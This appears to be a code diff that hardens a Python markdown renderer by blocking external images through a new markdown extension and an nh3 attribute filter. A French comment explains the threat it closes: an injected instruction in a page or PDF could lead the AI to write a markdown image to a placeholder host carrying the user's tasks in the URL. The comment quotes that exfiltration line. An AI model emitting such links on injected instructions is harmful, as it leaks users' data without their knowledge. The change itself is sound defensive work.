@@ -9,6 +9,8 @@ import markdown as md
 import nh3
 from markupsafe import Markup, escape
 
+from ..securite import ExternalImages, media_filter
+
 _CODE_RE = re.compile(r"(```.*?(?:```|$)|`[^`\n]+`)", re.S)
 _MATH_RE = re.compile(r"(\$\$.+?\$\$|\\\[.+?\\\]|\\\(.+?\\\)|(?<![\\$\w])\$(?!\s)[^$\n]+?(?<!\s)\$(?![\w$]))", re.S)
 
@@ -33,12 +35,15 @@ def render(text: str | None) -> Markup:
     parts = _CODE_RE.split(src)
     for i in range(0, len(parts), 2):
         parts[i] = _MATH_RE.sub(protect, parts[i])
-    html = md.markdown("".join(parts), extensions=["extra", "sane_lists", "nl2br"], output_format="html")
+    html = md.markdown("".join(parts), extensions=["extra", "sane_lists", "nl2br", ExternalImages()],
+                       output_format="html")
     html = re.sub(r"<li>\s*\[ \]\s*", '<li class="task"><input type="checkbox" disabled> ', html)
     html = re.sub(r"<li>\s*\[[xX]\]\s*", '<li class="task done"><input type="checkbox" checked disabled> ', html)
     attrs = {k: set(v) for k, v in ALLOWED_ATTRS.items()}
     attrs.setdefault("pre", set())
-    clean = nh3.clean(html, tags=set(ALLOWED_TAGS) | {"pre"}, attributes=attrs,
+    # Aucune image externe : une consigne glissée dans une page ou un PDF pourrait faire écrire à l'IA
+    # ![ok](https://site/?d=<tes tâches>), que le navigateur chargerait sans clic (fuite de données).
+    clean = nh3.clean(html, tags=set(ALLOWED_TAGS) | {"pre"}, attributes=attrs, attribute_filter=media_filter,
                       url_schemes={"http", "https", "mailto"}, link_rel="noopener noreferrer")
     clean = re.sub(rf"{token}x(\d+)x", lambda m: str(escape(maths[int(m.group(1))])), clean)
     return Markup(clean)
